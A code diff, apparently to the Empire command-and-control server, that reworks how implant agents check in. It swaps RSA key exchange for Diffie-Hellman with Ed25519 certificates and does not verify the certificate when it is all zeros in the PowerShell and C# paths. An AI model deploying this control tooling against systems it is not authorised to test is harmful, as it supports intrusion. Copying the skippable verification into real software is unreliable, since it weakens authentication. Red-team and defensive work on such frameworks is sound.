@@ -16,6 +16,7 @@ from zlib_wrapper import decompress
 from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
 from empire.server.api.v2.credential.credential_dto import CredentialPostRequest
 from empire.server.common import encryption, helpers, packets
+from empire.server.common.encryption import AESCipher
 from empire.server.core.config.config_manager import empire_config
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
@@ -405,6 +406,9 @@ class AgentCommunicationService:
         additional,
         enc_data,
         staging_key,
+        agent_cert_public_key,
+        server_cert_private_key,
+        server_cert_public_key,
         listener_options,
         client_ip="0.0.0.0",
     ):
@@ -423,9 +427,10 @@ class AgentCommunicationService:
             message = f"Agent {session_id} from {client_ip} posted public key"
             log.info(message)
 
-            # decrypt the agent's public key
             try:
-                message = encryption.aes_decrypt_and_verify(staging_key, enc_data)
+                message = AESCipher.decrypt_and_verify(
+                    staging_key.encode("UTF-8"), enc_data
+                )
             except Exception:
                 # if we have an error during decryption
                 message = f"HMAC verification failed from '{session_id}'"
@@ -433,41 +438,56 @@ class AgentCommunicationService:
                 return "ERROR: HMAC verification failed"
 
             if language.lower() == "powershell":
-                # strip non-printable characters
-                message = "".join(
-                    [x for x in message.decode("UTF-8") if x in string.printable]
-                )
+                # Expect: client DH pub (exact 768 bytes, big-endian) || agent_cert (64 bytes)
+                if len(message) < 832:  # noqa: PLR2004
+                    log.error(f"Invalid PS stage0 length from {session_id}")
+                    return "ERROR: Invalid PowerShell stage0"
 
-                # client posts RSA key
-                if (len(message) < 400) or (  # noqa: PLR2004
-                    not message.endswith("</RSAKeyValue>")
-                ):
-                    message = f"Invalid PowerShell key post format from {session_id}"
-                    log.error(message)
-                    return "ERROR: Invalid PowerShell key post format"
+                client_pub_be = message[:768]  # 6144-bit MODP, big-endian
+                agent_cert = message[768:832]  # 64 bytes
 
-                # convert the RSA key from the stupid PowerShell export format
-                rsa_key = encryption.rsa_xml_to_key(message)
-
-                if not rsa_key:
-                    message = (
-                        f"Agent {session_id} returned an invalid PowerShell public key!"
+                # Make sure the first field really is an integer
+                try:
+                    clientPub = int.from_bytes(
+                        client_pub_be, byteorder="big", signed=False
                     )
-                    log.error(message)
-                    return "ERROR: Invalid PowerShell public key"
+                except Exception:
+                    log.exception("Bad PS DH public")
+                    return "ERROR: Invalid PowerShell DH public key"
 
-                message = f"Agent {session_id} from {client_ip} posted valid PowerShell RSA key"
+                # Only verify the agent cert if its actually present (not all zeros)
+                if any(agent_cert) and len(agent_cert) == 64:  # noqa: PLR2004
+                    try:
+                        if not encryption.checkvalid(
+                            agent_cert, b"SIGNATURE", agent_cert_public_key
+                        ):
+                            log.error(f"Invalid agent certificate from {session_id}")
+                            return f"Error: Invalid agent certificate from {session_id}"
+                    except Exception:
+                        log.exception("Agent cert parse/verify error")
+                        return f"Error: Invalid agent certificate from {session_id}"
+                else:
+                    log.debug(
+                        "PS stage0 without agent cert; skipping Ed25519 verification"
+                    )
+
+                # Continue DH as usual
+                serverPub = encryption.DiffieHellman()
+                serverPub.gen_key(clientPub)
+                # serverPub.key == the negotiated session key
+                message = (
+                    f"Agent {session_id} from {client_ip} posted valid Python PUB key"
+                )
                 log.info(message)
 
-                nonce = helpers.random_string(16, charset=string.digits)
+                # add the agent to the database now that it's "checked in"
                 delay = listener_options["DefaultDelay"]["Value"]
                 jitter = listener_options["DefaultJitter"]["Value"]
                 profile = listener_options["DefaultProfile"]["Value"]
                 killDate = listener_options["KillDate"]["Value"]
                 workingHours = listener_options["WorkingHours"]["Value"]
                 lostLimit = listener_options["DefaultLostLimit"]["Value"]
-
-                # add the agent to the database now that it's "checked in"
+                nonce = helpers.random_string(16, charset=string.digits)
                 agent = self.agent_service.create_agent(
                     db,
                     session_id,
@@ -478,33 +498,63 @@ class AgentCommunicationService:
                     killDate,
                     workingHours,
                     lostLimit,
+                    session_key=serverPub.key.hex(),
                     nonce=nonce,
                     listener=listener_name,
+                    language=language,
                 )
                 self.add_agent_to_cache(agent)
 
-                client_session_key = agent.session_key
-                data = f"{nonce}{client_session_key}"
+                server_cert = encryption.signature_unsafe(
+                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
+                )
 
-                data = data.encode("ascii", "ignore")
-
-                # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-                encdata = encryption.rsa_encrypt(rsa_key, data)
+                # server returns its public key and server_cert, so agent can make a shared secret
+                # with the server's public key, and agent can verify the server's authenticity.
+                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
+                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
+                data = nonce.encode("UTF-8") + pub_bytes + server_cert
+                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                 return packets.build_routing_packet(
                     staging_key, session_id, language, encData=encdata
                 )
 
             if language.lower() == "csharp":
-                message = int.from_bytes(message, "little")
-                if (len(str(message)) < 1000) or (len(str(message)) > 2500):  # noqa: PLR2004
-                    message = f"Invalid C# key post format from {session_id}"
-                    log.error(message)
-                    return f"Error: Invalid C# key post format from {session_id}"
+                # check that we recieved a valid certificate size. Message less then 832 can not contain a valid cert
+                # 832 comes from public key size + agent cert
+                if len(message) < 832:  # noqa: PLR2004
+                    log.error(f"Invalid C# stage0 length from {session_id}")
+                    return "ERROR: Invalid C# stage0"
 
-                # client posts PUBc key
-                clientPub = message
+                client_pub_be = message[:768]  # 6144-bit MODP, big-endian
+                agent_cert = message[768:832]  # 64 bytes
+
+                # Make sure the first field really is an integer (no “Python fuckery” here)
+                try:
+                    clientPub = int.from_bytes(
+                        client_pub_be, byteorder="big", signed=False
+                    )
+                except Exception:
+                    log.exception("Bad C# DH public")
+                    return "ERROR: Invalid C# DH public key"
+
+                # Only verify the agent cert if its actually present (not all zeros)
+                if any(agent_cert) and len(agent_cert) == 64:  # noqa: PLR2004
+                    try:
+                        if not encryption.checkvalid(
+                            agent_cert, b"SIGNATURE", agent_cert_public_key
+                        ):
+                            log.error(f"Invalid agent certificate from {session_id}")
+                            return f"Error: Invalid agent certificate from {session_id}"
+                    except Exception:
+                        log.exception("Agent cert parse/verify error")
+                        return f"Error: Invalid agent certificate from {session_id}"
+                else:
+                    log.debug(
+                        "PS stage0 without agent cert; skipping Ed25519 verification"
+                    )
                 serverPub = encryption.DiffieHellman()
-                serverPub.genKey(clientPub)
+                serverPub.gen_key(clientPub)
                 # serverPub.key == the negotiated session key
 
                 nonce = helpers.random_string(16, charset=string.digits)
@@ -538,46 +588,57 @@ class AgentCommunicationService:
                 self.add_agent_to_cache(agent)
 
                 # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
-                data = f"{nonce}{serverPub.publicKey}"
-                encdata = encryption.aes_encrypt_then_hmac(staging_key, data)
+                data = nonce.encode("UTF-8") + str(serverPub.publicKey).encode("UTF-8")
+                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                 return packets.build_routing_packet(
                     staging_key, session_id, language, encData=encdata
                 )
 
             if language.lower() == "python":
-                if (len(message) < 1000) or (len(message) > 2500):  # noqa: PLR2004
-                    message = f"Invalid Python key post format from {session_id}"
-                    log.error(message)
+                if (len(message) < 830) or (len(message) > 2500):  # noqa: PLR2004
                     return f"Error: Invalid Python key post format from {session_id}"
 
                 try:
-                    int(message)
+                    # Python fuckery. We are going to strip the key out of the end
+                    int(int.from_bytes(message[:768], byteorder="big", signed=False))
                 except Exception:
                     message = f"Invalid Python key post format from {session_id}"
                     log.error(message)
                     return message
 
+                # Need to split message of form:
+                # public_key for DH (768 bytes) | agent_cert for certs (64 bytes)
+                # into separate variables
+                clientPub = int.from_bytes(message[:768], byteorder="big", signed=False)
+                agent_cert = message[768:832]
+
+                # check verification of agent_cert using its public key so we can verify
+                if not encryption.checkvalid(
+                    agent_cert, b"SIGNATURE", agent_cert_public_key
+                ):
+                    message = f"Invalid agent certificate from {session_id}"
+                    log.error(message)
+                    return f"Error: {message}"
+
+                # We have now verified the agent certificate
+
                 # client posts PUBc key
-                clientPub = int(message)
                 serverPub = encryption.DiffieHellman()
-                serverPub.genKey(clientPub)
+                serverPub.gen_key(clientPub)
                 # serverPub.key == the negotiated session key
-
-                nonce = helpers.random_string(16, charset=string.digits)
-
                 message = (
                     f"Agent {session_id} from {client_ip} posted valid Python PUB key"
                 )
                 log.info(message)
 
+                # add the agent to the database now that it's "checked in"
                 delay = listener_options["DefaultDelay"]["Value"]
                 jitter = listener_options["DefaultJitter"]["Value"]
                 profile = listener_options["DefaultProfile"]["Value"]
                 killDate = listener_options["KillDate"]["Value"]
                 workingHours = listener_options["WorkingHours"]["Value"]
                 lostLimit = listener_options["DefaultLostLimit"]["Value"]
-
-                # add the agent to the database now that it's "checked in"
+                nonce = helpers.random_string(16, charset=string.digits)
                 agent = self.agent_service.create_agent(
                     db,
                     session_id,
@@ -595,41 +656,67 @@ class AgentCommunicationService:
                 )
                 self.add_agent_to_cache(agent)
 
-                # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
-                data = f"{nonce}{serverPub.publicKey}"
-                encdata = encryption.aes_encrypt_then_hmac(staging_key, data)
+                # sign with server's private key so agent can verify
+                server_cert = encryption.signature_unsafe(
+                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
+                )
+
+                # server returns its public key and server_cert, so agent can make a shared secret
+                # with the server's public key, and agent can verify the server's authenticity.
+                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
+                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
+                data = nonce.encode("UTF-8") + pub_bytes + server_cert
+                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                 return packets.build_routing_packet(
                     staging_key, session_id, language, encData=encdata
                 )
 
             if language.lower() == "go":
-                message = int.from_bytes(message)
-                if (len(str(message)) < 1000) or (len(str(message)) > 2500):  # noqa: PLR2004
+                # check that message has a valid block size
+                if (len(str(message)) < 830) or (len(str(message)) > 2500):  # noqa: PLR2004
                     message = f"Invalid Go key post format from {session_id}"
                     log.error(message)
                     return f"Error: Invalid Go key post format from {session_id}"
 
+                try:
+                    # Python fuckery. We are going to strip the key out of the end
+                    int(int.from_bytes(message[:768], byteorder="big", signed=False))
+                except Exception:
+                    message = f"Invalid Go key post format from {session_id}"
+                    log.error(message)
+                    return message
+
+                # Need to split message of form:
+                # public_key for DH (768 bytes) | agent_cert for certs (64 bytes)
+                # into separate variables
+                clientPub = int.from_bytes(message[:768], byteorder="big", signed=False)
+                agent_cert = message[768:832]
+
+                # check verification of agent_cert using its public key so we can verify
+                if not encryption.checkvalid(
+                    agent_cert, b"SIGNATURE", agent_cert_public_key
+                ):
+                    message = f"Invalid agent certificate from {session_id}"
+                    log.error(message)
+                    return f"Error: Invalid agent certificate from {session_id}"
+
+                # We have now verified the agent certificate
+
                 # client posts PUBc key
-                clientPub = message
                 serverPub = encryption.DiffieHellman()
-                serverPub.genKey(clientPub)
+                serverPub.gen_key(clientPub)
                 # serverPub.key == the negotiated session key
-
-                nonce = helpers.random_string(16, charset=string.digits)
-
-                message = (
-                    f"Agent {session_id} from {client_ip} posted valid Python PUB key"
-                )
+                message = f"Agent {session_id} from {client_ip} posted valid Go PUB key"
                 log.info(message)
 
+                # add the agent to the database now that it's "checked in"
                 delay = listener_options["DefaultDelay"]["Value"]
                 jitter = listener_options["DefaultJitter"]["Value"]
                 profile = listener_options["DefaultProfile"]["Value"]
                 killDate = listener_options["KillDate"]["Value"]
                 workingHours = listener_options["WorkingHours"]["Value"]
                 lostLimit = listener_options["DefaultLostLimit"]["Value"]
-
-                # add the agent to the database now that it's "checked in"
+                nonce = helpers.random_string(16, charset=string.digits)
                 agent = self.agent_service.create_agent(
                     db,
                     session_id,
@@ -647,8 +734,17 @@ class AgentCommunicationService:
                 )
                 self.add_agent_to_cache(agent)
 
-                data = f"{nonce}{serverPub.publicKey}"
-                encdata = encryption.aes_encrypt_then_hmac(staging_key, data)
+                # sign with server's private key so agent can verify
+                server_cert = encryption.signature_unsafe(
+                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
+                )
+
+                # server returns its public key and server_cert, so agent can make a shared secret
+                # with the server's public key, and agent can verify the server's authenticity.
+                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
+                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
+                data = nonce.encode("UTF-8") + pub_bytes + server_cert
+                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                 return packets.build_routing_packet(
                     staging_key, session_id, language, encData=encdata
                 )
@@ -662,14 +758,9 @@ class AgentCommunicationService:
             try:
                 session_key = self.agents[session_id]["sessionKey"]
                 if isinstance(session_key, str):
-                    if language in ["PYTHON", "GO", "CSHARP"]:
-                        session_key = bytes.fromhex(session_key)
-                    else:
-                        session_key = (self.agents[session_id]["sessionKey"]).encode(
-                            "UTF-8"
-                        )
+                    session_key = bytes.fromhex(session_key)
 
-                message = encryption.aes_decrypt_and_verify(session_key, enc_data)
+                message = AESCipher.decrypt_and_verify(session_key, enc_data)
                 parts = message.split(b"|")
 
                 if len(parts) < 12:  # noqa: PLR2004
@@ -753,9 +844,12 @@ class AgentCommunicationService:
         log.error(message)
         return None
 
-    def handle_agent_data(
+    def handle_agent_data(  # noqa: PLR0913
         self,
         staging_key,
+        agent_cert_public_key,
+        server_cert_private_key,
+        server_cert_public_key,
         routing_packet,
         listener_options,
         client_ip="0.0.0.0",
@@ -767,6 +861,7 @@ class AgentCommunicationService:
 
         Abstracted out sufficiently for any listener module to use.
         """
+
         if len(routing_packet) < 20:  # noqa: PLR2004
             message = f"handle_agent_data(): routingPacket wrong length: {len(routing_packet)}"
             log.error(message)
@@ -805,6 +900,9 @@ class AgentCommunicationService:
                                 additional,
                                 encData,
                                 staging_key,
+                                agent_cert_public_key,
+                                server_cert_private_key,
+                                server_cert_public_key,
                                 listener_options,
                                 client_ip,
                             ),
@@ -892,18 +990,11 @@ class AgentCommunicationService:
                     )
                 # get the session key for the agent
                 session_key = self.agents[session_id]["sessionKey"]
-
-                if self.agents[session_id]["language"].lower() in [
-                    "python",
-                    "ironpython",
-                    "go",
-                    "csharp",
-                ]:
-                    with contextlib.suppress(Exception):
-                        session_key = bytes.fromhex(session_key)
+                with contextlib.suppress(Exception):
+                    session_key = bytes.fromhex(session_key)
 
                 # encrypt the tasking packets with the agent's session key
-                encrypted_data = encryption.aes_encrypt_then_hmac(
+                encrypted_data = AESCipher.encrypt_then_hmac(
                     session_key, all_task_packets
                 )
 
@@ -929,19 +1020,12 @@ class AgentCommunicationService:
 
         # extract the agent's session key
         sessionKey = self.agents[session_id]["sessionKey"]
-
-        if self.agents[session_id]["language"].lower() in [
-            "python",
-            "ironpython",
-            "go",
-            "csharp",
-        ]:
-            with contextlib.suppress(Exception):
-                sessionKey = bytes.fromhex(sessionKey)
+        with contextlib.suppress(Exception):
+            sessionKey = bytes.fromhex(sessionKey)
 
         try:
             # verify, decrypt and depad the packet
-            packet = encryption.aes_decrypt_and_verify(sessionKey, enc_data)
+            packet = AESCipher.decrypt_and_verify(sessionKey, enc_data)
 
             # process the packet and extract necessary data
             responsePackets = packets.parse_result_packets(packet)
